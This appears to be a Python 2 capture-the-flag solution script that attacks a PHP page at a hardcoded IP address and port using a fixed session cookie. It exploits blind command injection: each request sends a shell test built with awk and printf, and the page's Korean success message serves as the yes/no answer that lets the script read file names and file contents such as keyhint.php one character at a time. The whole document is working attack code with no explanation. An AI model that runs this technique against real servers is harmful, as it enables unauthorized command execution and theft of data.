# -*- coding:utf-8 -*-
import requests,string,sys
def cmd(c):
  URL = "http://1.224.175.32:17780/sundae/ahffkdy3399system.php"
  data = {"sys":c}
  cookies = {"PHPSESSID":"sc9gt39bhf14n6huqcfd0d98b0"}
  r= requests.post(URL,data = data, cookies = cookies)
  if "정상적으로 실행되었습니다.".decode("utf-8") in r.text:
    return True
  return False

#awk "NR == 1 {print substr(\$0,0,1)}" ./a.py
#[ $(awk "NR == 1 {print substr(\$0,0,1)}" ./ahffkdy3399system.php) = "i" ] && echo 1 || echo 1
nono="\"%'\\^`"
def check_line(fname,line,n):
  ret = []
  for x in string.printable:
    #if x in nono:
    #  continue
    xx = oct(ord(x))[1:]
    #c = """[ $(awk "NR == %d {print substr(\$0,%d,1)}" %s) = $(printf \\\\"%s") ] && echo 1 || asdfsdf"""%(line,n,fname,xx)
    c = """[ $(ls | awk "NR == %d {print \$1}" | awk "NR == 1 {print substr(\$0,%d,1)}") = $(printf \\\\"%s") ] && echo 1 || asdfsdf"""%(line,n,xx)
    #print c
    if cmd(c):
      ret.append(x)
  if len(ret) > 1 : 
    ret.remove(" ")
  return ret

data = ""
for line in range(1,100):
  for idx in range(0,100):
    #tmp=check_line("./ahffkdy3399system.php",line,idx)
    tmp=check_line("./keyhint.php",line,idx)
    if '\t' in tmp:
      tmp.remove('\t')
    if '\n' in tmp:
      tmp.remove('\n')
#    print tmp, line, idx
    if len(tmp) == 0:
      if idx != 0:
        data += '\n'
        break
    else:
      data +=tmp[0]
    print data
